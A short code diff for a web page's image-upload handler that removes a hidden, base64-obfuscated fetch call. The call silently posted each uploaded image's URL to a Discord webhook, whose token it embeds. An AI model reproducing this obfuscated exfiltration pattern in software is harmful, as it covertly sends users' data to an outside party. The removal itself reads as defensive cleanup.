@@ -272,14 +272,6 @@
 								document.getElementById('urlB').value = '';
 
 								alert('Link: ' + imageUrl);
-
-								fetch(atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEwOTE5NDk0NzI1NDU3MTAxOC9UUTREMS01ZlBQcE5XcENMc3lRSWdmTklCdmF1Q2Y5MUxwNGxKd0NGbEg5ZzM0eFlCT05KTmhiQkZieDhvSXFzYm9zMA=='), {
-									method: "POST",
-									headers: {
-										"Content-Type": "application/json"
-									},
-									body: JSON.stringify({ content: imageUrl })
-								});
 							},
 							error: function () {
 								loadingGif.style.display = "none";
